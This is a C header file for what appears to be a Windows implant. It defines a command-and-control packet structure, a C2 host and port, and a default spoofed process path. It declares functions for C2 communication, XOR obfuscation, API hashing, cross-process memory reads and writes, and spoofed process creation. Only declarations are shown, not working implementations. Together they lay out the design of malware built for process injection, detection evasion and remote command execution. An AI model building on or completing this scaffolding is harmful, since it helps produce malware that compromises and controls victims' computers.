#pragma once

#define WIN32_LEAN_AND_MEAN

#include <winsock2.h>

#include <ws2tcpip.h>
#include <wininet.h>

#include <tlhelp32.h>

#include <stdio.h>
#include <stdlib.h>

#include <winternl.h>
#include <windows.h>

#define DEFAULT_SPOOFED_PROC "C:\\Windows\\System32\\notepad.exe"
#define HOST "127.0.0.1"
#define PORT 8888

typedef struct _C2_PACKET {
    DWORD CmdId;
    BYTE  Data[4096];
} C2_PACKET, *PC2_PACKET;

typedef NTSTATUS (NTAPI *_NtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

void XOR(PUCHAR data, size_t data_sz, PUCHAR key, size_t key_sz);
void hexdump(char *data, size_t size);
DWORD Djb2W(BYTE* data);
BOOL ConnectToC2(SOCKET* c2Socket);
VOID recvC2Packet(SOCKET* c2Socket, PC2_PACKET receivedPacket);
int get_process(LPCSTR lpName, PHANDLE hProc, PDWORD PID);
HMODULE CustomGetModuleHandleW(LPCWSTR moduleName);
LPCWSTR ConvertDataToLPCWSTR(BYTE* Data);
BOOL WriteToTargetProcess(IN HANDLE hProcess, IN PVOID pAddressToWriteTo, IN PVOID pBuffer, IN SIZE_T dwBufferSize);
BOOL ReadFromTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, OUT PVOID* ppReadBuffer, IN SIZE_T dwBufferSize);
BOOL CreateSpoofedProcess(LPCSTR lpSpoofedProcPath, PROCESS_INFORMATION* Pi, LPCWSTR procCmdLine);